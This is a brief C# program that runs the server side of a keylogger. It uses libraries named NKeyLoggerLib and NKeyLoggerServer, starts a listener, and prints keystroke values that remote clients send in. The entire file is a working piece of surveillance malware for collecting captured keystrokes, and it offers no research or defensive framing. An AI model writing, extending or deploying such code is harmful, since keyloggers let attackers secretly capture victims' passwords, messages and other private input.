using System.Security.Cryptography;
using NKeyLoggerLib;
using NKeyLoggerServer;

Server server = new Server();
var startTask = server.start();
server.keyHandler += (Server serv, Network user, AbstractKeyInfo key) =>
{
    Console.WriteLine(key.getValues().First() + " " + key.getValues().ElementAt(3));
};
startTask.Wait();
